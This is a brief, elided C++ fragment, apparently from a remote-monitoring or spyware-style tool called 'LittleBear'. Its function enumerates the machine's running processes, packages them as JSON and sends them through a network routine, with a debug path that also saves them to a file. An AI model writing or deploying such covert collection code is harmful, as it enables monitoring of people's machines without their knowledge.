...
int GetRunningProcessInfo()
{
	...
	{
		WriteLittleBearLog("GetRunningProcessInfo lpCreateToolhelp32Snapshot error\r\n");
		return FALSE;
	}
	...
	iRet = IndependentNetWork_SendMessage((char*)infojson.c_str(), infojson.length(), RUNNING_APPS, 0);

#ifdef _DEBUG
	char strFilePath[MAX_PATH] = { 0 };
	iRet = ModifyModuleFileName(strFilePath, RUNNINGAPPS_FILENAME);
